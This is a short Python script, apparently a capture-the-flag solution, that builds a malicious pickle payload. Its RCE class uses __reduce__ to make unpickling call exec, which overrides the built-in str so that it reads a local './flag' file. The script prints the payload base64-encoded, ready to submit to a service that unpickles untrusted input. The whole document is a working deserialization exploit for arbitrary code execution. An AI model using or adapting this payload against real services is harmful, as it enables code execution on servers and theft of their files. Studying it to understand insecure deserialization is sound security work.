import pickle
import base64
class RCE:
    def __reduce__(self):
        return exec,('globals()[\'str\']=lambda x:open(\'./flag\').read()',)
p = pickle.dumps(RCE())

print(base64.urlsafe_b64encode(p))
